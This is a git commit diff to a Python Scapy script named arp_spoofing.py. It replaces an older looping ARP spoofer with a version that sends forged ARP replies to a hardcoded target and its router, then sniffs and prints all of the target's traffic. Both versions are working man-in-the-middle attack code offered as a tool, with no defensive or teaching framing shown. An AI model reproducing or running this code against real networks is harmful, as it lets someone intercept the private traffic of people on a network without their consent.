f494c726b876c7bc810b5314d927b434401e198f
bou6 <boussettaachraf26@gmail.com>
2023-04-29 12:56:23 +0200

    correct spoofing

--- arp_spoofing.py
+++ arp_spoofing.py
@@ -1,36 +1,28 @@
 from scapy.all import *
-import sys
-import time
 
-def arp_spoof(router_ip, attacker_mac, victim_ip):
-    packet = ARP(op="is-at", hwsrc=attacker_mac, psrc = router_ip, pdst= victim_ip)
-    packet.show()
-    send(packet, verbose=False)
+# Set the IP address of the target and the router
+target_ip = "192.168.1.13"
+router_ip = "192.168.1.1"
 
-def arp_restore(victim_ip, router_ip, router_mac):
-    packet= ARP(op="is-at", hwsrc=router_mac,psrc= router_ip, pdst= victim_ip)
-    send(packet, verbose=False)
+# Get the MAC addresses of the target and the router
+target_mac = getmacbyip(target_ip)
+router_mac = getmacbyip(router_ip)
 
-def main():
-    victim_ip= sys.argv[1]
-    router_ip= sys.argv[2]
-    victim_mac = getmacbyip(victim_ip)
-    router_mac = getmacbyip(router_ip)
-    my_mac = get_if_hwaddr(conf.iface)
+# Create ARP packets to spoof the target and the router
+target_arp = ARP(op=2, pdst=target_ip, psrc=router_ip, hwdst=target_mac)
+router_arp = ARP(op=2, pdst=router_ip, psrc=target_ip, hwdst=router_mac)
 
-    print (victim_ip )
-    print (router_ip)
-    print (victim_mac)
-    print (router_mac)
-    
-    try:
-       print("Sending spoofed ARP packets")
-       while True:
-            arp_spoof(router_ip, my_mac, victim_ip)
-            time.sleep(1)
-    except KeyboardInterrupt:
-        print("Restoring ARP Tables")
-        arp_restore(victim_ip, router_ip, router_mac)
-        quit()
+# Send the ARP packets to start the ARP spoofing attack
+send(target_arp)
+send(router_arp)
 
-main()
+# Set up a packet sniffing function to intercept traffic
+def sniff_packets(packet):
+    if packet.haslayer(IP):
+        if packet[IP].src == target_ip:
+            print("Target sent: " + packet.summary())
+        elif packet[IP].dst == target_ip:
+            print("Target received: " + packet.summary())
+
+# Start sniffing packets
+sniff(prn=sniff_packets, filter="host " + target_ip)
